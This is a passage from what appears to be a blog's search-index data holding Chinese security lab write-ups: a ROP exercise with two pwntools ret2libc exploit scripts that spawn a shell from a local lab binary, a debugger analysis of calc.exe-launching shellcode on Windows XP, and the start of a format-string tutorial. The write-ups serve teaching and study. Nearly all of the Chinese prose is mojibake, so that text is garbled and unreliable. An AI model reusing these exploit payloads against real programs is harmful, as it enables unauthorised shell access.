ˆå¯¹é½çš„è¯ï¼Œç¨‹åºå°±ç›´æ¥crashäº†ã€‚\næˆ‘ä»¬è¿™é‡Œå¡«å……çš„å­—ç¬¦é•¿åº¦ä¸º0x88ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åœ¨åŠ å…¥0x08ä¸ªå­—ç¬¦æ¥å¹³è¡¡æ ˆï¼Œè¿™ç§æƒ…å†µä¸‹å¦‚åŠ å…¥æ–°çš„å­—èŠ‚ä¸èƒ½å½±å“æˆ‘ä»¬ROPé“¾çš„æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬è¯¥å­—ç¬¦å­˜å‚¨å› æ”¹ä¸ºretæŒ‡ä»¤ç±»ä¼¼çš„ä¸å½±å“é€»è¾‘çš„æŒ‡ä»¤ã€‚\næˆ‘ä»¬åŒæ ·æ ¹æ®ROPgadgetæ¥æ‹¿åˆ°å¯¹åº”çš„retå­˜æ”¾çš„åœ°å€\næˆ‘ä»¬ç›´æ¥æŸ¥çœ‹ä½äºlibc.soä¸­çš„ç¨‹åºä¸­ä¸€ä¸ªå­˜å‚¨retæŒ‡ä»¤çš„åœ°å€\nå‘½ä»¤ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only \u0026quot;ret\u0026quot;\nå› ä¸ºè¿™é‡Œç›¸å¯¹åç§»åŸºäºlibc.soçš„é¦–åœ°å€ä¸º0x0000000000025679\næ‰€ä»¥retçš„å®é™…åœ°å€ä¸º0x7ffff7dcd000+0x0000000000025679\nå°†å¡«å……å¥½çš„åœ°å€ å†™å…¥expä¸­ï¼Œåœ¨ç»ˆç«¯æ‰§è¡Œexp\næœ€ç»ˆexp\n1 2 3 4 5 6 7 8 9 10 11 12 13 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) ret_addr= 0x7ffff7dcd000+0x0000000000025679 sys_addr= 0x7ffff7e22410 binsh_addr=0x7ffff7f845aa pr_addr = 0x7ffff7dcd000 + 0x26b72 payload = b\u0026#39;a\u0026#39;*0x88+ p64(ret_addr)+ p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() Ubuntu16 ä¸­æ­£å¸¸æ²¡æœ‰å­—èŠ‚å¯¹é½ ubuntuç‰ˆæœ¬\næ‰¾åˆ°å­˜åœ¨pop rdi;retçš„æŒ‡ä»¤åœ°å€\nç›¸å¯¹åç§»åœ°å€ä¸º0x0000000000021112 systemåœ°å€\nsystem åœ°å€ä¸º 0x7ffff7a523a0 /bin/shåœ°å€\nlibc.soé¦–åœ°å€0x7ffff7a0d000,/bin/shé¦–åœ°å€0x7ffff7b99e57 expç»ˆç«¯ç›´æ¥æ‰§è¡Œ\nå‘ç°æ‹¿åˆ°shell æœ€ç»ˆexp\n1 2 3 4 5 6 7 8 9 10 11 12 from pwn import * p = process(\u0026#39;./rop3\u0026#39;) sys_addr= 0x7ffff7a523a0 binsh_addr=0x7ffff7b99e57 pr_addr = 0x7ffff7a0d000 + 0x21112 payload = \u0026#39;a\u0026#39;*0x88 + p64(pr_addr)+p64(binsh_addr)+p64(sys_addr)+p64(0xdeadbeef) p.sendline(payload) p.interactive() 0x05 å®éªŒç»“è®º å®éªŒè¿‡ç¨‹ä¸­é’ˆå¯¹å®éªŒä¸€ï¼Œåˆ†åˆ«ä½¿ç”¨äº†gdbç›´æ¥è°ƒè¯•å¾—åˆ°shellå’Œé€šè¿‡pwntoolsç»“åˆdump coreå¾—åˆ°shellä¸¤ç§æ–¹æ¡ˆï¼Œä½†æ˜¯å®é™…ä¸Šä¸¤ç§æ–¹æ¡ˆä¸­è¿ç”¨çš„åœ°å€å¹¶ä¸æ˜¯ç¨‹åºç›´æ¥è¿è¡Œæ—¶å€™bufæ•°ç»„çš„åœ°å€ï¼ŒäºŒè€…å› ä¸ºç¨‹åºè¿è¡Œç¯å¢ƒçš„å·®å¼‚ï¼Œbufçš„åœ°å€éƒ½æœ‰å·®å¼‚ã€‚ åŒæ—¶å‘¢ï¼Œè¿ç”¨gdbè°ƒè¯•shellcodeï¼Œç›´æ¥å†™å…¥æ•°æ®æ¯”è¾ƒéº»çƒ¦ï¼Œå› ä¸ºshellcodeè¯»å–éœ€è¦å­—èŠ‚æµï¼Œè¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯åˆ©ç”¨pwntoolsç”Ÿæˆçš„payloadä¿å­˜ä¸ºæ–‡ä»¶ï¼Œä»¥ç®¡é“çš„å½¢å¼å°†å…¶è¾“å…¥åˆ°gdbä¸­ã€‚æ­¤å¤–ï¼Œåœ¨æŸ¥çœ‹shellcodeè°ƒè¯•æ•ˆæœçš„æ—¶å€™ï¼Œéœ€è¦è®¾ç½®è½¯æ–­ç‚¹æ¥è°ƒç”¨å­è¿›ç¨‹ï¼Œå¹¶ä¸”ä¸€æ¬¡åªèƒ½æŸ¥çœ‹ä¸€ä¸ªå‘½ä»¤çš„ç»“æœï¼Œä¸ä¾¿äºæŒä¹…åŒ–shellè¿æ¥ï¼Œä½†æ˜¯gdbæ–¹ä¾¿è°ƒè¯•ï¼Œéšæ„è®¾ç½®æ–­ç‚¹ï¼ŒæŸ¥çœ‹è‡ªå·±æƒ³çœ‹çš„ä¸œè¥¿ï¼Œå®šä½åˆ°readå‡½æ•°é‡Œé¢æŸ¥çœ‹bufçš„åœ°å€ï¼Œå¾ˆæ–¹ä¾¿ã€‚ python è°ƒè¯•å‘¢ï¼Œå› ä¸ºç»“åˆç¨‹åºè¿è¡Œå´©æºƒäº§ç”Ÿçš„core,åœ¨pythonç¯å¢ƒä¸‹çš„bufåœ°å€ç›¸å½“æ˜æœ—ï¼Œå€ŸåŠ©pwntoolsçš„å·¥å…·ï¼Œå¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ payloadï¼Œå°†å…¶å‘é€ç»™æœåŠ¡å™¨ç«¯å¹¶å»ºç«‹æŒä¹…åŒ–çš„shellè¿æ¥ï¼Œä½†æ˜¯è°ƒè¯•çš„è¯ä¸å¤ªæ–¹ä¾¿ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨åœ¨pwntoolsé‡Œé¢è°ƒç”¨gdbæ¥å®ç°ã€‚æ‰€ä»¥æ€»ä½“æ¥è¯´ï¼Œrop1-modified.pyè„šæœ¬è°ƒè¯•æ›´ä¸ºæ–¹ä¾¿ï¼ŒåŠŸèƒ½ä¹Ÿæ›´ä¸ºå¼ºå¤§ã€‚ å¯¹äºå®éªŒäºŒ å¯¹äºUbuntu18 ä»¥ä¸Šçš„ç‰ˆæœ¬ï¼Œè°ƒè¯•64ä½ç¨‹åºçš„æ—¶å€™ï¼Œæˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„payloadä¸€èˆ¬è¦è€ƒè™‘å­—èŠ‚å¯¹é½çš„å› ç´ ï¼Œä¸€èˆ¬é‡‡ç”¨retæ¥è¿›è¡Œå¯¹é½ã€‚ å……åˆ†ç†è§£äº†ROPé“¾çš„æ„é€ è¿‡ç¨‹ äº†è§£äº†Linuxä¸‹systemå’Œexecå‡½æ•°çš„ç”¨æ³•ã€‚ ","permalink":"http://www.reus09.top/posts/tech/rop/","summary":"pwn_rop è°ƒè¯• 0x01 å®éªŒç›®çš„ 1.é’ˆå¯¹å®éªŒä¸€ï¼Œé€šè¿‡gdbè°ƒè¯•rop1ï¼Œç¡®å®šshellcodeçš„åœ°å€ï¼›æ­¤å¤–ï¼Œé€šè¿‡rop1.pyçš„è°ƒè¯•è„šæœ¬ç¡®å®šshellcod","title":"Rop"},{"content":"é€†å‘åˆ†æè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ 0x01 å®éªŒç›®çš„ æ ¹æ®å®éªŒè½¯ä»¶SCer.exe å’Œ shellcodeä»£ç shellcode2020.mybinï¼Œé€šè¿‡windbgé€†å‘åˆ†æå¼¹å‡ºè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¯¦ç»†è¿‡ç¨‹ æ ¹æ®å®éªŒè½¯ä»¶shellcode2020.exeï¼Œé€šè¿‡Ollydbgé€†å‘åˆ†æå¼¹å‡ºè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¯¦ç»†è¿‡ç¨‹ã€‚ åˆ†æä¸¤è€…åŒºåˆ«ã€‚ 0x02 è¯•éªŒå·¥å…· windbg Ollydbg IDA_PRO å› ä¸ºWindows xp sp3ä¸‹çš„Windbgå¾®è½¯å°†å…¶åœ¨çº¿Symbolç¬¦å·ä¸‹æ¶ï¼Œå¯¼è‡´Windbgè°ƒè¯•è¿‡ç¨‹ä¸­ï¼Œéƒ¨åˆ†å…³é”®å‡½æ•°ä¸ºä¹±ç ï¼Œæ— æ³•æ­£å¸¸åˆ†æï¼Œæ•…å€Ÿé‰´Ida å®éªŒç¯å¢ƒ Windows xp sp3 0x03 windbg è°ƒè¯• Scer.exe æ‰“å¼€Scer.exeï¼Œç„¶åå°†shellcode.txt.mybiné™„åŠ åˆ°ç¨‹åºï¼Œå¯ä»¥å‘ç°è®¡ç®—å™¨å¯ä»¥æ­£å¸¸æ‰“å¼€ã€‚\néœ€è¦å¯¹Scer.exeè¿›è¡ŒåŠ¨æ€è°ƒè¯•åˆ†æï¼Œä¸ºäº†è°ƒè¯•åˆ†ææ¤å…¥çš„shellcode,æˆ‘ä»¬åœ¨shellcode.txt.binå‰åŠ ä¸Šå­—èŠ‚0xCC\nç„¶ååœ¨windbgä¸­é™„åŠ  Scer.exeçš„è¿›ç¨‹ã€‚\nè¿™é‡Œç¨‹åºä¼šåœåœ¨ç³»ç»Ÿä»£ç åŒºåŸŸï¼Œæˆ‘ä»¬è¦è¿›å…¥ç”¨æˆ·ä»£ç é‡Œé¢ã€‚ WinDbgé‡Œæœ‰ä¸ªä¼ªå¯„å­˜å™¨å«$exentryï¼Œé‡Œé¢è®°å½•äº†ç¨‹åºçš„å…¥å£ç‚¹ã€‚æ‰€ä»¥æˆ‘ä»¬åªè¦åœ¨å‘½ä»¤è¾“å…¥æ é‡Œè¾“å…¥bp $exentry ç„¶åæ‰§è¡Œå‘½ä»¤gå³å¯è¿›å…¥ç”¨æˆ·ç¨‹åºå…¥å£ã€‚ è¿™é‡Œç»“åˆIDA_proï¼ŒF5åç¼–è¯‘å¯ä»¥çœ‹åˆ° è¿™é‡Œå®ç°äº†ç¨‹åºçš„åˆå§‹åŒ–ï¼Œå°±ä¸åœ¨è¿‡å¤šåˆ†æã€‚ è¿™é‡Œé€šè¿‡IDA_PROï¼Œæ‰¾åˆ°æˆ‘ä»¬åŠ è½½æ ¸å¿ƒä»£ç shellcode çš„é¦–åœ°å€ã€‚\né¦–å…ˆshift+F12æŸ¥çœ‹å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å­—ç¬¦ä¸²çŠ¶æ€:0x%0.8x å·²è½½å…¥shellcode,å³å°†å¼€å§‹æ‰§è¡Œ...ï¼Œä¸€è·¯åè·Ÿè¸ªå‡½æ•°è¿”å›ï¼Œæ‰¾åˆ°è¯¥æ®µåŠŸèƒ½çš„é¦–åœ°å€ä¸ºï¼š0x401830 ä¹Ÿå°±æ˜¯è¯´åœ¨æ­¤æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†å‘ç¨‹åºä¸­è¾“å…¥shellcodeåï¼Œç¨‹åºå¦‚ä½•å¤„ç†shellcodeä»¥åŠå¦‚ä½•è·³è½¬åˆ°shellcodeçš„è¿‡ç¨‹ åœ¨windbg ä¸‹ è®¾ç½®æ–­ç‚¹ bp 0x401830\nåŠ è½½æˆ‘ä»¬çš„shellcode åï¼Œå°±å¯ä»¥åœ¨windbgä¸­è°ƒè¯• çœ‹åˆ°ç¨‹åºæ€ä¹ˆå°†shellcodeå­˜æ”¾èµ·æ¥å¹¶æ‰§è¡Œã€‚ ç„¶åè¾“å…¥pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªcall æŒ‡ä»¤ï¼Œç„¶åæ­¥å…¥ï¼Œè¿™ä¸ªå‡½æ•°ä¸º CreateFileAã€‚\nå‘ç°è¯¥å‡½æ•°åŠŸèƒ½å®ç°äº†åˆ›å»ºä¸€ä¸ªçº¿ç¨‹\u0026mdash;\u0026mdash;\u0026mdash;-æ‰“å¼€æ–‡ä»¶å¤¹ï¼Œå³æˆ‘ä»¬çš„shellcodeæ–‡ä»¶ã€‚ ç»§ç»­pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œè¿™ä¸ªå‡½æ•°ä¸º VirtualAlloc\nè¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹VirtualAllocå‡½æ•°çš„ç»“æ„\n1 2 3 4 5 6 LPVOID VirtualAlloc{ LPVOID lpAddress, // è¦åˆ†é…çš„å†…å­˜åŒºåŸŸçš„åœ°å€ DWORD dwSize, // åˆ†é…çš„å¤§å° DWORD flAllocationType, // åˆ†é…çš„ç±»å‹ DWORD flProtect // è¯¥å†…å­˜çš„åˆå§‹ä¿æŠ¤å±æ€§ }; å¹¶ä¸”ä¸è°ƒå…¥å‡½æ•°å‰ä¼ å…¥çš„å‚æ•°ç›¸ç»“åˆå¯¹æ¯”ï¼Œ\nå‘ç° ebx å­˜å–çš„æ˜¯ æˆ‘ä»¬shellcode çš„å­—èŠ‚é•¿åº¦ï¼Œesiå­˜æ”¾çš„æ˜¯ ç¨‹åºç»™ shellcode åˆ†é…çš„åŠ¨æ€åœ°å€ã€‚\nç¨‹åºæ‰§è¡Œå®Œæ¯•åï¼Œå¾ˆæ˜æ˜¾å¯ä»¥å‘ç°äº†esi å­˜å–çš„ åœ°å€ä¸º 0xb40000\nè¿™é‡Œå°±å®ç°äº†ä¸º shellcodeçš„å­˜å– æå‰åˆ†é…å¥½äº† åŠ¨æ€åœ°å€ï¼Œ èµ·å§‹åœ°å€ä¸º 0xb40000\nç»§ç»­pcè·³è½¬åˆ°ä¸‹ä¸€ä¸ªcallå‡½æ•°ï¼Œè¯¥å‡½æ•°åå­—ä¸º ReadFile\nè¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹VirtualAllocå‡½æ•°çš„ç»“æ„\n1 2 3 4 5 6 7 8 9 BOOL ReadFile( HANDLE hFile, //æ–‡ä»¶çš„å¥æŸ„ LPVOID lpBuffer, //ç”¨äºä¿å­˜è¯»å…¥æ•°æ®çš„ä¸€ä¸ªç¼“å†²åŒº DWORD nNumberOfBytesToRead, //è¦è¯»å…¥çš„å­—èŠ‚æ•° LPDWORD lpNumberOfBytesRead, //æŒ‡å‘å®é™…è¯»å–å­—èŠ‚æ•°çš„æŒ‡é’ˆ LPOVERLAPPED lpOverlapped //å¦‚æ–‡ä»¶æ‰“å¼€æ—¶æŒ‡å®šäº†FILE_FLAG_OVERLAPPEDï¼Œé‚£ä¹ˆå¿…é¡»ï¼Œç”¨è¿™ä¸ªå‚æ•°å¼•ç”¨ä¸€ä¸ªç‰¹æ®Šçš„ç»“æ„ã€‚ //è¯¥ç»“æ„å®šä¹‰äº†ä¸€æ¬¡å¼‚æ­¥è¯»å–æ“ä½œã€‚å¦åˆ™ï¼Œåº”å°†è¿™ä¸ªå‚æ•°è®¾ä¸ºNULL ); æ­¤æ—¶çš„å¯„å­˜å™¨æƒ…å†µï¼š\nå°†å‡½æ•°ç»“æ„ ä¸ ä¼ å‚å‰çš„ æ±‡ç¼–è¯­è¨€è¿›è¡Œ å¯¹æ¯”ã€‚\nå¯ä»¥å‘ç°å‡½æ•°å®ç°äº†åœ¨åœ°å€ä¸ºesi :: 0xb40000 çš„ç¼“å†²åŒº å­˜å–äº† é•¿åº¦ä¸º27 å­—èŠ‚çš„ shellcodeã€‚\nç»§ç»­pcè¿›è¡Œåˆ°sleepå‡½æ•°ã€‚\nå› ä¸ºè¦ç­‰å¾…æ­¤æ—¶çš„çº¿ç¨‹å®Œæˆã€‚ ç»§ç»­pæŒ‡ä»¤ å•æ­¥è·³è¿‡ï¼Œä¸€ç›´åˆ°\næ­¤æ®µæ•´ä½“æ±‡ç¼–ä»£ç å¯¹åº”ç”¨IDA_Proæ˜¾ç¤º\nmov bp+ms_exc.registration.TryLevel], 0 ; è¿›å…¥ç¬¬ä¸€ä¸ª__tryåŸŸ,TryLevel=0\nmov ebp+ms_exc.registration.TryLevel], 0FFFFFFFEh ; ç¦»å¼€ç¬¬ä¸€ä¸ª__tryåŸŸï¼ŒTryLevel=TRYLEVEL_NONE (-2)\næ‰€ä»¥æ­¤æ®µä¸º try_except çš„è¿‡ç¨‹ã€‚\nç„¶åå‘ç°å­˜åœ¨æ±‡ç¼–è¯­å¥call eax\ncall eax æ¥è‡ª [ebp + var_24]\nè¿½è¸ªå‘ç° [ebp+var_24]å­˜æ”¾çš„æ˜¯esiçš„åœ°å€ï¼Œå³0xb40000 å› æ­¤è¿™æ®µä»£ç ï¼Œå°±æ˜¯ç¨‹åºè¿›å…¥é¢„å…ˆåˆ†é…å¥½çš„åŠ¨æ€å†…å­˜åŒº(é‡Œé¢å­˜æœ‰shellcodeï¼‰çš„å…¥å£ã€‚\nè¿›å…¥å‡½æ•°ï¼Œåˆ†æshellcodeã€‚\nç¨‹åºæ‰§è¡Œåˆ°0xb40001è·³è½¬åˆ°åœ°å€0xb40019ï¼Œç„¶åå‘ç°åœ¨åœ°å€0xb40019çš„ jmp æŒ‡ä»¤è·³è½¬åˆ° 0xb40003\nè¿™é‡Œè§£é‡Šä¹ˆè¦å…ˆcall è·³è½¬åˆ° 0xb40019ç„¶åå†å›åˆ°0xb40003\ncall/popæŒ‡ä»¤ Shellcodeå¯ä»¥é€šè¿‡åœ¨ä¸€ä¸ªcallæŒ‡ä»¤åç«‹å³æ‰§è¡ŒpopæŒ‡ä»¤ï¼Œå°†ä¸Šä¸€åˆ»å‹å…¥æ ˆä¸­çš„æŒ‡ä»¤åœ°å€è½½å…¥åˆ°å¯„å­˜å™¨ä¸­ï¼Œä»è€Œè·å–åˆ°shellcodeèµ·å§‹çš„å†…å­˜åœ°å€ã€‚ åŸç†å°±æ˜¯ï¼šcall æŒ‡ä»¤å®é™…ä¸Šå°±æ˜¯ å…ˆå°†è¯¥å‡½æ•°çš„ä¸‹ä¸€ä¸ªåœ°å€å‹å…¥æ ˆä¸­ï¼Œç„¶åè·³è½¬åˆ°ç›®çš„åœ°å€ã€‚è·³è½¬ä¹‹åå†å°†å…¶popå‡ºæ¥ï¼Œè¿™æ ·å°±è¾¾åˆ°äº†ebx å­˜æ”¾ åœ°å€0xb4001eçš„ä½œç”¨ã€‚ è¿™é‡Œé€šè¿‡call 0xb40003æŒ‡ä»¤è°ƒç”¨å®Œä¹‹åå¯¹æ ˆçš„åˆ†æï¼Œå¯ä»¥çœ‹å‡ºã€‚ æ˜¾ç„¶ï¼Œæ ˆæœ€é¡¶å±‚ä¸ºcalc.exe å­˜æ”¾çš„åœ°å€ã€‚ ç„¶åå¼€å§‹ pop ebx ï¼Œå°† eax æ¸…é›¶ã€‚\nç„¶åå‘æ ˆä¸­å‹å…¥ ebx,eaxã€‚ ebxæ­¤æ—¶å­˜æ”¾çš„åœ°å€ä¸º0xb4001eå³å­—ç¬¦ä¸²\\x63\\x61x6c\\x63\\x2e\\x65\\x78\\x65å¯¹åº”çš„calc.exe\nå°†å‡½æ•°kernel32!WinExecåœ°å€ä¼ ç»™ebxã€‚\nä¸Šé¢ä¸¤ä¸ªå‹æ ˆç›¸å½“äº å¯¹ä¸‹é¢çš„å‡½æ•° kernel32!WinExecè¿›è¡Œä¼ å‚ã€‚\n1 2 UINT WinExec( LPCSTR lpCmdLine, UINT uCmdShow ); è¿™æ ·å°±ç›¸å½“äºè°ƒç”¨å‡½æ•° winExec(\u0026quot;calc.exe\u0026quot;,0)æ¥æ‰“å¼€è®¡ç®—å™¨ã€‚\nå‡½æ•°è°ƒç”¨å®Œæˆåã€‚å°†eaxç½®0ï¼Œç„¶åå…¥æ ˆï¼Œå°†å‡½æ•°kernel32!ExitProcessåœ°å€ä¼ ç»™ebxã€‚ç›¸å½“äºå‘å‡½æ•°kernel32!ExitProcessä¼ å…¥å‚æ•°ï¼Œç»“æŸè°ƒç”¨çš„è¿›ç¨‹åŠå…¶æ‰€æœ‰çš„çº¿ç¨‹windowså‡½æ•°ã€‚\nshellcodeåˆ†æå®Œæ¯•ã€‚\nåœ¨å‘½ä»¤ä¸­è¾“å…¥gï¼Œå³å¯å¼¹å‡ºè®¡ç®—å™¨ã€‚\n0x04 Ollydbg è°ƒè¯• shellcode2020.exe ç›´æ¥æ‰§è¡Œshellcode2020.exeä¼šç›´æ¥å¼¹å‡ºè®¡ç®—å™¨ã€‚\nåŠ¨æ€åˆ†æå‰:\né€šè¿‡IDA_Pro å¯ä»¥ç›´æ¥å®šä½åˆ° mainå‡½æ•°åœ°å€ä¸º : 0x401290 åœ¨Ollydbgä¸­è®¾ç½®æ–­ç‚¹0x401290,ç„¶åè¿è¡Œç¨‹åºè·³è½¬åˆ°è¯¥åœ°å€\n1 2 3 4 5 6 7 8 9 10 push ebp mov ebp,esp æ›´æ–°å‡½æ•°æ ˆå¸§ sub esp,8 and esp,FFFFFFF0 mov eax,0 add eax,0f add eax,0f shr eax,4 shl eax,4 å°† (eax + 0f + 0f )å…ˆå·¦ç§»ä¸€ä½ï¼Œåå³ç§»ä¸€ä½ï¼Œç»“æœä¸º00000010 ç„¶åè¿›å…¥åˆ°åœ°å€ä¸º0x401710çš„å‡½æ•°ï¼Œç»“åˆIDAï¼Œè¯¥å‡½æ•°ä¸ºallocaå‡½æ•°ï¼Œäº§ç”Ÿå‡½æ•°æŒ‡é’ˆã€‚\n1 2 3 4 5 6 7 8 åŸå‹ï¼š void * __cdecl alloca(size_t); å‚æ•°ï¼š size_t: ç”³è¯·åˆ†é…å†…å­˜çš„å°ºå¯¸ è¿”å›å€¼ï¼š void*: åˆ†é…åˆ°çš„å†…å­˜åœ°å€ allocaä¸malloc,calloc,reallocç±»ä¼¼,éœ€è¦æ³¨æ„çš„æ˜¯å®ƒç”³è¯·çš„æ˜¯â€œæ ˆ(stack)â€ç©ºé—´çš„å†…å­˜ï¼Œç”¨å®Œä¼šåœ¨é€€å‡ºæ ˆæ—¶è‡ªåŠ¨é‡Šæ”¾ï¼Œæ— éœ€æ‰‹åŠ¨é‡Šæ”¾ã€‚ allocaä¸å®œä½¿ç”¨åœ¨å¿…é¡»å¹¿æ³›ç§»æ¤çš„ç¨‹åºä¸­, å› ä¸ºæœ‰äº›æœºå™¨ä¸ä¸€å®šæœ‰ä¼ ç»Ÿæ„ä¹‰ä¸Šçš„\u0026#34;å †æ ˆ\u0026#34; è¿›å…¥å‡½æ•°0x4013b0ï¼Œæ‰§è¡ŒåŠ è½½å‡½æ•°ï¼Œå°†shellcodeåŠ è½½åˆ°ä»£ç åŒºã€‚\nç„¶åè®¾ç½®æ–­ç‚¹ 0x4012baï¼Œç„¶åå•æ­¥æ­¥å…¥\nå‘ç°dword ptr[ebp - 4]è¢«èµ‹å€¼ä¸ºåœ°å€0x402000 è§‚å¯ŸIDAï¼Œå‘ç°åœ°å€0x40200çš„åœ°æ–¹å­˜å–çš„æ•°æ®ä¸ºevilæ•°ç»„ï¼Œå³shellcodeå­˜æ”¾åœ°å€ã€‚ åŒæ—¶0x402000ä¹Ÿæ˜¯æ–‡ä»¶æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œdataç«¯çš„èµ·å§‹ä½ç½®ã€‚ æ­¥å…¥ï¼ŒæŸ¥çœ‹shellcodeã€‚\nå‘ç°å¤§è‡´æµç¨‹å’Œwindbgåˆ†æè¿‡ç¨‹ä¸€æ ·ã€‚\né€šè¿‡callå’Œpopç»“åˆè¿ç”¨ï¼Œå°†ebxèµ‹å€¼ä¸º åœ°å€0x40201d ebxæ­¤æ—¶å­˜æ”¾çš„ä¸ºå­—ç¬¦ä¸²calc.exe ç„¶ååŒæ ·çš„å‹æ ˆæ“ä½œï¼Œè°ƒç”¨å‡½æ•°Kernel32!WinExecè¿›è¡Œæ‰§è¡Œè®¡ç®—å™¨ã€‚\næ‰§è¡Œå®Œæ¯•åï¼Œåˆå°†eaxç½®0 ï¼Œå°†å‡½æ•°kernel32!ExitProcessçš„åœ°å€ä¼ ç»™ebx,è°ƒç”¨ebxåœ°å€æ‰€åœ¨çš„ç¨‹åºï¼Œå³ExitProcess(\u0026lsquo;0\u0026rsquo;)ï¼Œé€€å‡ºç¨‹åºã€‚\n0x05 æ€»ç»“(åŒºåˆ«) Scer.exeåˆ›é€ ä¸€ä¸ªæ–°çš„çº¿ç¨‹ï¼Œç„¶åé€šè¿‡è¯»å–æ–‡ä»¶å†…å®¹ä½œä¸ºshellcodeï¼Œå¹¶é€šè¿‡VirtualAllocç”³è¯·å†…å­˜ï¼Œxpé‡Œé¢è¿™ä¸ªå†…å­˜åœ°å€å‡ä¸º0xb40000å¹¶ä¸”ç”¨esiä¿å­˜è¿™ä¸ªåœ°å€ï¼Œç„¶åReadFileå³åœ¨è™šæ‹Ÿåœ°å€0xb40000ä¸­å†™å…¥shellcodeï¼Œç„¶åé€šè¿‡format,updateç­‰å‡½æ•°shellcodeè¿›è¡Œè½¬æ¢ï¼Œæœ€ååœ°å€å°†å…¶ä½œä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œè¿›è¡Œè°ƒç”¨ï¼Œè¿›å…¥shellcodeã€‚ shellcode2020.exeåˆ™æ˜¯åœ¨æ–‡ä»¶çš„.dataç«¯ å­˜æ”¾æˆ‘ä»¬çš„shellcodeã€‚é€šè¿‡å‡½æ•°allocaæ¥åœ¨å †ä¸Šç”³è¯·å†…å­˜ï¼Œå¹¶ä¸”ç”¨å‡½æ•°æŒ‡é’ˆå¯¹å…¶è°ƒç”¨ï¼Œæœ€åè°ƒç”¨.dataçš„èµ·å§‹åœ°å€ï¼Œè¿è¡Œæˆ‘ä»¬æ„é€ çš„shellcode,å¯ä»¥è¿è¡Œè®¡ç®—å™¨ã€‚ å› æ­¤ä¸¤è€…çš„åŒºåˆ«ï¼šä¸€ä¸ªæ˜¯ä»å¤–éƒ¨æ¤å…¥shellcodeï¼Œå°†å…¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¦ä¸€ä¸ªæ˜¯ç¨‹åºæœ¬èº«è‡ªå¸¦çš„shellcodeï¼Œé€šè¿‡æ„é€ å‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œshellcodeã€‚ ","permalink":"http://www.reus09.top/posts/tech/shellcode-%E8%AE%A1%E7%AE%97%E5%99%A8/","summary":"é€†å‘åˆ†æè®¡ç®—å™¨çš„æ¼æ´åˆ©ç”¨è¿‡ç¨‹ 0x01 å®éªŒç›®çš„ æ ¹æ®å®éªŒè½¯ä»¶SCer.exe å’Œ shellcodeä»£ç shellcode2020.mybinï¼Œé€šè¿‡win","title":"Shellcode è®¡ç®—å™¨"},{"content":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ 0x01 ç›®çš„ é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æŒæ¡æ³„éœ²å†…å­˜æ•°æ®å’Œè¦†å†™å†…å­˜ã€‚ 0x02 åŸºç¡€çŸ¥è¯† æ ¼å¼åŒ–å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„ANSI Cå‡½æ•°ï¼Œå®ƒä»¬ä»æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­æå–å‚æ•°ï¼Œå¹¶å¯¹è¿™äº›å‚æ•°è¿›è¡Œå¤„ç†ã€‚è€Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å°†Cè¯­è¨€çš„ä¸»è¦æ•°æ®ç±»å‹ï¼Œä»¥æ˜“äºé˜…è¯»çš„æ–¹å¼ä¿å­˜åœ¨å­—ç¬¦ä¸²é‡Œã€‚ä»ç¨‹åºè¾“å‡ºæ•°æ®ã€æ‰“å°é”™è¯¯ä¿¡æ¯åˆ°å¤„ç†å­—ç¬¦ä¸²æ•°æ®ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å‡ ä¹å‡ºç°åœ¨æ‰€æœ‰çš„Cç¨‹åºä¸­ã€‚\nprintf åŠŸèƒ½ï¼šå‘stdoutæŒ‰è§„å®šçš„æ ¼å¼è¾“å‡ºä¿¡æ¯ï¼›\næ ¼å¼ï¼š\n1 int printf (const char *format,[argument]...) formatæ˜¯æ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²ï¼Œå…¶ä»–å‚æ•°ä¸ºè¾“å‡ºé¡¹ï¼› printf(\u0026quot;Id=%d\u0026quot;,Id); sprintf åŠŸèƒ½ï¼šæŠŠæ ¼å¼åŒ–çš„æ•°æ®å†™å…¥æŸä¸ªå­—ç¬¦ä¸²ä¸­ï¼›\næ ¼å¼ï¼š\n1 int sprintf(char *buffer,const char *format,[argument]...) bufferæ˜¯è¦å¸ä¹³å­—ç¬¦ä¸²çš„ç¼“å†²åŒºï¼› å‡½æ•°æŒ‰ç…§ç¬¬äºŒéƒ¨åˆ†æ ¼å¼åŒ–å­—ç¬¦çš„æ ¼å¼ï¼ŒæŠŠç¬¬ä¸‰éƒ¨åˆ†çš„æ•°æ®è¿›è¡Œæ ¼å¼åŒ–ï¼Œç„¶ååœ¨æŠŠæ ¼å¼åŒ–åçš„æ•°æ®ç±»å‹ï¼Œå­˜å‚¨åˆ°å­—ç¬¦ä¸²çš„ç¼“å­˜åŒºé—´é‡Œå»ï¼› sprintf(buffer, \u0026quot;Id=%d\u0026quot;, Id); snprintf åŠŸèƒ½ï¼šæŠŠæ 